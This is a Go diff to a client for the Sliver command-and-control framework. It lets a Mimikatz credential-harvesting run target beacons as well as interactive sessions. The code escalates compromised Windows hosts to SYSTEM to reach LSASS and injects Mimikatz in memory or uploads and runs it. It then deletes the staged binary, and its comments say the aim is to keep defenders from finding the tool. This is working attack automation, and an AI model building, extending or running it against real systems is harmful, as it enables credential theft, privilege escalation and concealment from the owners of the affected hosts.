@@ -557,6 +557,67 @@ func (c *Client) MimikatzImport(parsed []ParsedCredential, originUUID string) (i
 // to start, call back and register, and a slow link is not a failure.
 const escalationWait = 60 * time.Second
 
+// harvestTarget names the thing a credential run is aimed at.
+//
+// It exists because a beacon and a session reach the same operations by
+// different routes -- the beacon's calls carry Async and BeaconID, the session's
+// carry nothing special -- and the previous code only knew how to speak to a
+// session. A beacon then fell through the escalation step entirely, silently.
+type harvestTarget struct {
+	// SessionID is set for an interactive session.
+	SessionID string
+	// BeaconID is set for a beacon.
+	BeaconID string
+}
+
+func (t harvestTarget) isBeacon() bool { return t.BeaconID != "" && t.SessionID == "" }
+
+// String names the target for a message. It prints the ID because an operator
+// with several targets open needs to know which one a note is about.
+func (t harvestTarget) String() string {
+	if t.isBeacon() {
+		return "beacon " + t.BeaconID
+	}
+	return "session " + t.SessionID
+}
+
+// SessionTarget names an interactive session.
+func SessionTarget(sessionID string) harvestTarget {
+	return harvestTarget{SessionID: sessionID}
+}
+
+// BeaconTarget names a beacon.
+func BeaconTarget(beaconID string) harvestTarget {
+	return harvestTarget{BeaconID: beaconID}
+}
+
+// ResolveTarget works out whether id names a session or a beacon, by asking the
+// server which table it is in.
+//
+// Looked up rather than inferred from the string: Sliver does not promise the
+// two ID spaces are distinguishable by shape, and guessing wrong would point a
+// credential harvest at the wrong host.
+func (c *Client) ResolveTarget(id string) (harvestTarget, error) {
+	if id == "" {
+		return harvestTarget{}, errNoIntegritySource
+	}
+	if sessions, err := c.Sessions(); err == nil {
+		for _, s := range sessions {
+			if s.ID == id {
+				return harvestTarget{SessionID: id}, nil
+			}
+		}
+	}
+	if beacons, err := c.Beacons(); err == nil {
+		for _, b := range beacons {
+			if b.ID == id {
+				return harvestTarget{BeaconID: id}, nil
+			}
+		}
+	}
+	return harvestTarget{}, fmt.Errorf("no session or beacon has id %q", id)
+}
+
 // escalateForMimikatz checks the session's token and, when it is not elevated,
 // escalates to SYSTEM before the credential run.
 //
@@ -569,13 +630,21 @@ const escalationWait = 60 * time.Second
 // on an administrator account looks privileged in every other respect -- the
 // username, the group list, `whoami /groups` -- and still cannot open LSASS,
 // which is exactly the confusion this removes.
-func (c *Client) escalateForMimikatz(sessionID, hostingProcess string, result *MimikatzResult) string {
-	level, err := c.SessionIntegrity(sessionID)
+func (c *Client) escalateForMimikatz(target harvestTarget, hostingProcess string, result *MimikatzResult) string {
+	level, err := c.targetIntegrity(target)
 	if err != nil {
-		// Not a Windows session, or the RPC is unavailable. Either way there is
-		// nothing to escalate and no useful thing to say; the run proceeds and
-		// its own output is the report.
-		return ""
+		// This used to return "" and say nothing, on the reasoning that a failure
+		// here is not the run's fault. That was wrong in the way that matters:
+		// the failure was guaranteed on a beacon, and staying quiet turned a
+		// missing code path into a diagnosis about the operator's token. The run
+		// still proceeds -- best-effort has not changed -- but it now says which
+		// step was skipped and why.
+		return fmt.Sprintf(
+			"could not read the token integrity of %s (%v), so escalation to SYSTEM was "+
+				"skipped. If the run below reports an LSA access-denied, that is why: the "+
+				"payload ran on the original token. vault::cred and dpapi::cred do not need "+
+				"elevation and work either way",
+			target, err)
 	}
 	result.Integrity = level
 
@@ -583,19 +652,62 @@ func (c *Client) escalateForMimikatz(sessionID, hostingProcess string, result *M
 		return ""
 	}
 
-	newID, err := c.ElevateToSystem(sessionID, hostingProcess, escalationWait)
+	newID, err := c.targetElevateToSystem(target, hostingProcess, escalationWait)
 	if err != nil {
 		return fmt.Sprintf(
-			"this session's token is at %s integrity, which cannot open LSASS, and escalating to "+
-				"SYSTEM failed (%v). Running anyway so the raw output is visible; the modules that "+
-				"work without elevation are vault::cred and dpapi::cred",
-			level, err)
+			"this %s's token is at %s integrity, which cannot open LSASS, and escalating to "+
+				"SYSTEM failed (%v). Running anyway so the raw output is visible; the modules "+
+				"that work without elevation are vault::cred and dpapi::cred",
+			targetKind(target), level, err)
 	}
 
 	result.Elevated = true
 	result.SessionID = newID
 	return fmt.Sprintf("escalated from %s integrity to a SYSTEM session", level)
 }
+
+// targetKind names the target for a message, without the ID.
+func targetKind(t harvestTarget) string {
+	if t.isBeacon() {
+		return "beacon"
+	}
+	return "session"
+}
+
+// targetIntegrity reads the token integrity of whichever target this is.
+//
+// The two directions are not variations on one call. GetPrivs resolves a
+// SessionID through the server's session table, and a beacon is not in that
+// table -- which is why asking on a beacon's behalf with a session-shaped
+// request returns InvalidSessionID every time.
+func (c *Client) targetIntegrity(t harvestTarget) (string, error) {
+	if t.isBeacon() {
+		return c.BeaconIntegrity(t.BeaconID, beaconIntegrityWait)
+	}
+	if t.SessionID == "" {
+		return "", errNoIntegritySource
+	}
+	return c.SessionIntegrity(t.SessionID)
+}
+
+// targetElevateToSystem runs GetSystem against whichever target this is.
+func (c *Client) targetElevateToSystem(t harvestTarget, hostingProcess string, wait time.Duration) (string, error) {
+	if t.isBeacon() {
+		return c.BeaconElevateToSystem(t.BeaconID, hostingProcess, wait)
+	}
+	if t.SessionID == "" {
+		return "", errNoIntegritySource
+	}
+	return c.ElevateToSystem(t.SessionID, hostingProcess, wait)
+}
+
+// beaconIntegrityWait bounds the wait for a beacon to answer GetPrivs.
+//
+// Longer than a session's because a beacon only acts on its next check-in: at a
+// sixty-second sleep interval the answer is a minute away by construction, and
+// timing out before that would report "beacon did not answer" for a beacon that
+// was going to.
+const beaconIntegrityWait = 3 * time.Minute
 
 // executeWithTimeout runs the mimikatz command with a caller-chosen deadline and
 // a request timeout the server will honour.
@@ -615,7 +727,20 @@ func (c *Client) executeWithTimeout(sessionID, path string, args []string, op ti
 // the target's temp directory and executed, or injected into a host process
 // without ever touching the disk. The in-memory routes live in mimikatz_memory.go
 // because that path has its own rules about when refusal is the right answer.
-func (c *Client) MimikatzRun(sessionID string, req MimikatzRequest, originUUID string) (*MimikatzResult, error) {
+// MimikatzRun executes a credential-dumping command, parses the output, and
+// optionally imports what it found.
+//
+// target is a session or a beacon. Both are accepted because the operator's
+// intent is the same on either, and refusing the beacon case is what left the
+// escalation step un-run for beacon operators.
+func (c *Client) MimikatzRun(target harvestTarget, req MimikatzRequest, originUUID string) (*MimikatzResult, error) {
+	sessionID := target.SessionID
+	if target.isBeacon() {
+		// A beacon has no session ID at all; the field is only used to stamp the
+		// result, and stamping it with the beacon ID is what makes the run
+		// traceable back to the host it came from.
+		sessionID = target.BeaconID
+	}
 	command := strings.TrimSpace(req.Command)
 	if command == "" {
 		command = DefaultMimikatzCommand
@@ -645,12 +770,28 @@ func (c *Client) MimikatzRun(sessionID string, req MimikatzRequest, originUUID s
 	// proceeds on the original session and the result says so. Refusing to try
 	// would be worse than trying and reporting.
 	var escalationNote string
-	target := sessionID
+	// runOn is where the payload actually goes. Escalation can move it: GetSystem
+	// produces a NEW session rather than elevating the current one, so a
+	// successful escalation redirects every later step there. The parameter is
+	// left alone so the result still names what the operator asked for.
+	runOn := target
 	if req.Elevate == nil || *req.Elevate {
-		escalationNote = c.escalateForMimikatz(sessionID, req.HostingProcess, result)
+		escalationNote = c.escalateForMimikatz(target, req.HostingProcess, result)
 		if result.Elevated {
-			target = result.SessionID
+			runOn = harvestTarget{SessionID: result.SessionID}
 		}
+	}
+	if runOn.SessionID == "" {
+		// Escalation did not move us and the target is still a beacon. The
+		// execution paths need a session: Sideload, Upload and Execute all
+		// resolve their target through the session table. Saying so is the point
+		// of this rework -- the previous code reached the same conclusion and
+		// reported it as an unelevated token.
+		return nil, fmt.Errorf(
+			"credential harvesting needs an interactive session, and this target is a %s "+
+				"whose escalation did not produce one. Open an interactive session from it "+
+				"(the console's beacon view has that action) and run the harvest there",
+			targetKind(target))
 	}
 
 	// --- Execution ---------------------------------------------------------
@@ -661,7 +802,7 @@ func (c *Client) MimikatzRun(sessionID string, req MimikatzRequest, originUUID s
 	// file answers a question the operator did not ask.
 	var executionNote string
 	if mode != MimikatzModeUpload {
-		raw, note, err := c.runMimikatzInMemory(target, command, payload, custom, req.Process)
+		raw, note, err := c.runMimikatzInMemory(runOn.SessionID, command, payload, custom, req.Process)
 		if err != nil {
 			if mode == MimikatzModeMemory {
 				return nil, err
@@ -682,13 +823,13 @@ func (c *Client) MimikatzRun(sessionID string, req MimikatzRequest, originUUID s
 		// than the original user's. Writing first would leave the binary in a
 		// directory the elevated process may not be able to read, which surfaces
 		// as a launch failure that looks like a broken payload.
-		path := c.mimikatzTargetPath(target)
-		if err := c.Upload(target, path, payload); err != nil {
+		path := c.mimikatzTargetPath(runOn.SessionID)
+		if err := c.Upload(runOn.SessionID, path, payload); err != nil {
 			return nil, fmt.Errorf("upload %s: %w", path, err)
 		}
 		// "exit" keeps the tool from dropping into its interactive prompt, which
 		// would hold the pipe open until the timeout instead of returning output.
-		out, err := c.executeWithTimeout(target, path, []string{command, "exit"}, mimikatzTimeout)
+		out, err := c.executeWithTimeout(runOn.SessionID, path, []string{command, "exit"}, mimikatzTimeout)
 		if err != nil {
 			return nil, err
 		}
@@ -701,7 +842,7 @@ func (c *Client) MimikatzRun(sessionID string, req MimikatzRequest, originUUID s
 		// The binary is removed once it has run. A temp directory is not a hiding
 		// place: leaving it there means the next person to list %TEMP% finds the
 		// tool that was used against the host.
-		if note := c.cleanupStagedFile(target, path); note != "" {
+		if note := c.cleanupStagedFile(runOn.SessionID, path); note != "" {
 			executionNote = note
 		}
 	}
